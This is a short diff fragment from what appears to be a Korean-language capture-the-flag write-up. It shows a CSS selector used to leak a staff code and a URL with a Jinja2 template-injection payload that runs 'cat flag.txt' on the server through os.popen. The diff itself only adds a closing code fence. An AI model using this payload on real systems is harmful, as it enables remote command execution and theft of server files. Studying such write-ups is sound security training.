@@ -92,6 +92,7 @@ blue;} input#staff_code[value^=a] {
 
 ```text
 http://~/list?code=찾은스탭코드&motd={% print url_for.__globals__['os'].popen('cat flag.txt').read() %}
+```
 
 -실행 시 서버 내부의 flag.txt 내용을 획득할 수 있습니다.
 
